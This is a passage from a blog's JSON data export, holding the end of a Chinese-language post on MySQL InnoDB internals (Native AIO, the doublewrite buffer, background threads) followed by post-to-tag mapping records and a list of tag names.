AIO，因此编译或允许该版本MySQL时需要libaio库的支持。Native AIO需要操作系统提供支持，Windows系统和Linux系统都提供Native AIO支持，而Mac OSX系统则未提供，只能依旧使用原模拟的方式。</p>\n<p>可以通过参数<code>innodb_use_native_aio</code>来控制启用Native AIO，Linux系统下默认启用（ON）。</p>\n<h3 id=\"4-两次写\"><a href=\"#4-两次写\" class=\"headerlink\" title=\"4. 两次写\"></a>4. 两次写</h3><p>当数据库宕机时，可能InnoDB正在写入某个页到表中，而这个页只写了一部分，比如16KB的页，只写了前4KB，之后就发生了宕机，这种情况被称为部分写失效。有经验的DBA也许会想如果发生写失效，可以通过重做日志进行恢复。但实际上并不一定可以修复，页内数据有可能本身发生损坏（这与重做日志记录的内容有关，参考<a href=\"https://blog.csdn.net/jolly10/article/details/79791574\" target=\"_blank\" rel=\"noopener\">mysql 为何需要Double Write？有redo log还不够吗？</a>，估计是因为重做日志在页内的记录与最终写入磁盘的并不是完全相同的，还会经过一次与底层结构相关的计算），需要先通过页的副本来还原页，再进行重做，这个副本就就是doublewrite的内容。</p>\n<p>doublewrite由两部分组成，一部分是内存中的doublewrite buffer，大小为2MB，另一部分是物理磁盘上共享表空间中的连续的2个区（128个页，也是2MB）。在对缓冲区进行刷新时，并不直接写磁盘，而是会通过memcpy函数将页先复制到内存中的doublewrite buffer，之后通过doublewrite  buffer再分两次，每次1MB顺序地写入共享表空间的物理磁盘上，然后马上调用fsync函数，同步磁盘，避免缓冲带来的问题。由于doublewrite页是连续的，因此这个过程是顺序写的，开销并不是很大。在完成doublewrite页写入后，再将doublewrie buffer中的页写入各个表空间文件中，此时写入是离散的。</p>\n<p>参数<code>skip_innodb_doublewrite</code>可以禁止使用doublewrite功能，有些情况下，这是需要的，如：用户有多个从服务器（在从服务器上做的是RAID0），可以在从服务器上关闭doublewrite功能；有些文件系统（ZFS文件系统）本身提供了部分写失效的防范机制，就不用开启doublewrite功能。</p>\n<p><img src=\"../static/MB20031501-6.png\" alt=\"图1\"></p>\n<h2 id=\"后台线程\"><a href=\"#后台线程\" class=\"headerlink\" title=\"后台线程\"></a>后台线程</h2><h3 id=\"1-Master线程\"><a href=\"#1-Master线程\" class=\"headerlink\" title=\"1. Master线程\"></a>1. Master线程</h3><p>负责将重做日志缓冲刷新到重做日志文件</p>\n<h3 id=\"2-IO线程\"><a href=\"#2-IO线程\" class=\"headerlink\" title=\"2. IO线程\"></a>2. IO线程</h3><p>Async IO，分为4种线程</p>\n<ol>\n<li>Read线程（默认4条线程，由<code>innodb_read_io_thread</code>参数控制）</li>\n<li>Write线程（默认4条线程，由<code>innodb_write_io_thread</code>参数控制）</li>\n<li>Insert Buffer线程（1条线程）</li>\n<li>Log线程（1条线程）</li>\n</ol>\n<h3 id=\"3-Purge线程\"><a href=\"#3-Purge线程\" class=\"headerlink\" title=\"3. Purge线程\"></a>3. Purge线程</h3><p>支持设置多个线程，由<code>innodb_purge_threads</code>控制</p>\n<p>负责任务UNDO页回收，<code>innodb_purge_batch_size</code>控制每次回收数量</p>\n<h3 id=\"4-Cleaner线程\"><a href=\"#4-Cleaner线程\" class=\"headerlink\" title=\"4. Cleaner线程\"></a>4. Cleaner线程</h3><p>负责将缓冲池中的脏页刷新到磁盘</p>\n"}],"PostAsset":[],"PostCategory":[],"PostTag":[{"post_id":"ck5qhi05b000ag0ukfmek0zk6","tag_id":"ck5qhi05f000cg0ukodn4ztqk","_id":"ck5qhi05m000hg0ukl9yzulxi"},{"post_id":"ck5qhi05e000bg0ukli08b7sj","tag_id":"ck5qhi05l000gg0ukilg58yy4","_id":"ck5qhi05v000mg0uk3lktlqzi"},{"post_id":"ck5qhi05n000jg0ukkviu78r0","tag_id":"ck5qhi05l000gg0ukilg58yy4","_id":"ck5qhi05w000og0uk52dfj182"},{"post_id":"ck5qhi05i000dg0ukx8645vt5","tag_id":"ck5qhi05l000gg0ukilg58yy4","_id":"ck5qhi05x000rg0ukvto6bkp3"},{"post_id":"ck5qhi05j000eg0ukrcwk8h9f","tag_id":"ck5qhi05w000pg0ukqxb8g9cy","_id":"ck5qhi060000vg0uki53yhe3u"},{"post_id":"ck5qhi05l000fg0ukamextg8y","tag_id":"ck5qhi05z000tg0ukzz8p771f","_id":"ck5qhi062000zg0ukgztsdn46"},{"post_id":"ck5qhi0620010g0uk24mk2fj2","tag_id":"ck5qhi05z000tg0ukzz8p771f","_id":"ck5qhi0650013g0ukox26qm0c"},{"post_id":"ck5qhi05m000ig0ukzdw5av76","tag_id":"ck5qhi061000xg0ukiftlipti","_id":"ck5qhi0660015g0ukmhggz0s6"},{"post_id":"ck5qhi05u000lg0ukhdoj7p68","tag_id":"ck5qhi05z000tg0ukzz8p771f","_id":"ck5qhi0670018g0ukr7dszn54"},{"post_id":"ck5qhi05v000ng0ukqfs107r1","tag_id":"ck5qhi0670017g0ukjx6vh3q0","_id":"ck5qhi06a001dg0uk4nbpivx3"},{"post_id":"ck5qhi05x000qg0ukum9thxpz","tag_id":"ck5qhi0670017g0ukjx6vh3q0","_id":"ck5qhi06d001hg0ukw2b0do72"},{"post_id":"ck5qhi06b001eg0ukqd47g4xe","tag_id":"ck5qhi05l000gg0ukilg58yy4","_id":"ck5qhi06e001jg0ukgjlacp6g"},{"post_id":"ck5qhi06c001gg0ukcqeqdok0","tag_id":"ck5qhi0670017g0ukjx6vh3q0","_id":"ck5qhi06f001mg0uk1idd68ek"},{"post_id":"ck5qhi05y000sg0ukz4jy55t8","tag_id":"ck5qhi0670017g0ukjx6vh3q0","_id":"ck5qhi06h001og0ukmfefpqfp"},{"post_id":"ck5qhi05z000ug0ukk5x9ya86","tag_id":"ck5qhi0670017g0ukjx6vh3q0","_id":"ck5qhi06j001rg0uk86n7k347"},{"post_id":"ck5qhi060000wg0ukzftjde94","tag_id":"ck5qhi06i001pg0ukiefnsm22","_id":"ck5qhi06l001ug0ukjkgzuy7w"},{"post_id":"ck5qhi06k001sg0uk2hoxyv2u","tag_id":"ck5qhi0670017g0ukjx6vh3q0","_id":"ck5qhi06l001vg0ukyrekhz51"},{"post_id":"ck5qhi061000yg0ukhptqpntl","tag_id":"ck5qhi0670017g0ukjx6vh3q0","_id":"ck5qhi06m001xg0ukonqkl93l"},{"post_id":"ck5qhi0630011g0ukbj7gnrf4","tag_id":"ck5qhi06m001wg0ukmnl3dtnn","_id":"ck5qhi06n001zg0ukxcyzlnt9"},{"post_id":"ck5qhi0650014g0ukep0ao024","tag_id":"ck5qhi06m001wg0ukmnl3dtnn","_id":"ck5qhi06o0021g0uk9jm0g16f"},{"post_id":"ck5qhi0660016g0uk1km2ih0u","tag_id":"ck5qhi06m001wg0ukmnl3dtnn","_id":"ck5qhi06o0023g0ukoiphsw8e"},{"post_id":"ck5qhi0670019g0uk6ausihk1","tag_id":"ck5qhi06m001wg0ukmnl3dtnn","_id":"ck5qhi06p0025g0ukvgtk3cui"},{"post_id":"ck5qhi06a001cg0ukpbrknb9s","tag_id":"ck5qhi06q0026g0uk1bdspd2g","_id":"ck5qhi06r0029g0uk9awr7k3v"},{"post_id":"ck5qhi06d001ig0ukt56bdsex","tag_id":"ck5qhi06m001wg0ukmnl3dtnn","_id":"ck5qhi06s002bg0ukw0dq6kzl"},{"post_id":"ck5qhi06f001lg0ukbj0u0l3s","tag_id":"ck5qhi06m001wg0ukmnl3dtnn","_id":"ck5qhi06t002dg0uk2ou46cme"},{"post_id":"ck5qhi06h001ng0ukbiu3xjs0","tag_id":"ck5qhi06s002cg0ukm8c08nzg","_id":"ck5qhi06t002fg0uk0p24xkm8"},{"post_id":"ck5qhi06i001qg0uk62ih4sof","tag_id":"ck5qhi06t002eg0ukdb39e0vn","_id":"ck5qhi06u002gg0ukn0sjtq9z"},{"post_id":"ck5qhi073002lg0ukczko5nwf","tag_id":"ck5qhi06m001wg0ukmnl3dtnn","_id":"ck5qhi075002og0ukhjzdwxji"},{"post_id":"ck5qhi06z002hg0ukuh6xk7sv","tag_id":"ck5qhi071002jg0ukxs554igf","_id":"ck5qhi076002qg0ukqd5rsex7"},{"post_id":"ck5qhi074002mg0uk0fz82vy1","tag_id":"ck5qhi06m001wg0ukmnl3dtnn","_id":"ck5qhi078002sg0ukhma8d6eq"},{"post_id":"ck5qhi070002ig0ukqanry1rg","tag_id":"ck5qhi075002ng0uketr3efww","_id":"ck5qhi078002tg0uko75hl60s"},{"post_id":"ck5qhi071002kg0ukj843fgy6","tag_id":"ck5qhi077002rg0ukcjx3iw0d","_id":"ck5qhi07b002vg0uk02p1uv7n"},{"post_id":"ck5qhi075002pg0uks9hqbyjk","tag_id":"ck5qhi077002rg0ukcjx3iw0d","_id":"ck5qhi07c002wg0ukx3f74rio"},{"post_id":"ck5qhi07k002xg0uknlwwmuix","tag_id":"ck5qhi07l002yg0ukb6izeka8","_id":"ck5qhi07m002zg0uk35ntnb9n"},{"post_id":"ck6hqy6yk00014cukb3cf9t2n","tag_id":"ck5qhi06p0024g0uksmbxcxct","_id":"ck6hqy6yp00034cukiojkde7r"},{"post_id":"ck71vzldl0000swukl56pkpk3","tag_id":"ck71vzldt0001swukfoqtaqes","_id":"ck71vzle00002swukwbs42t97"},{"post_id":"ck71vzlej0003swukx0qhzd72","tag_id":"ck71vzlep0004swukjijviq80","_id":"ck71vzler0005swukj5hzsk7w"},{"post_id":"ck7uob5oo0000n4ukgpa633tm","tag_id":"ck5qhi05z000tg0ukzz8p771f","_id":"ck7uob5ou0002n4ukq5c6qch9"},{"post_id":"ck7uob5os0001n4ukahwqxzcf","tag_id":"ck5qhi05z000tg0ukzz8p771f","_id":"ck7uob5ow0003n4uk8mh7qncg"}],"Tag":[{"name":"redis","_id":"ck5qhi05f000cg0ukodn4ztqk"},{"name":"spring","_id":"ck5qhi05l000gg0ukilg58yy4"},{"name":"css","_id":"ck5qhi05w000pg0ukqxb8g9cy"},{"name":"mysql","_id":"ck5qhi05z000tg0ukzz8p771f"},{"name":"MyBatis","_id":"ck5qhi061000xg0ukiftlipti"},{"name":"linux","_id":"ck5qhi0670017g0ukjx6vh3q0"},{"name":"dubbo","_id":"ck5qhi06i001pg0ukiefnsm22"},{"name":"java","_id":"ck5qhi06m001wg0ukmnl3dtnn"},{"name":"IDE","_id":"ck5qhi06p0024g0uksmbxcxct"},{"name":"vulnerability","_id":"ck5qhi06q0026g0uk1bdspd2g"},{"name":"open source","_id":"ck5qhi06s002cg0ukm8c08nzg"},{"name":"log4j","_id":"ck5qhi06t002eg0ukdb39e0vn"},{"name":"maven","_id":"ck5qhi071002jg0ukxs554igf"},{"name":"docker","_id":"ck5qhi075002ng0uketr3efww"},{"name":"api","_id":"ck5qhi077002rg0ukcjx3iw0d"},{"name":"RabbitMQ","_id":"ck5qhi07l002yg0ukb6izeka8"},{"name":"图论","_id":"ck71vzldt0001swukfoqtaqes"},{"name":"encoding","_id":"ck71vzlep0004swukjijviq80"}]}}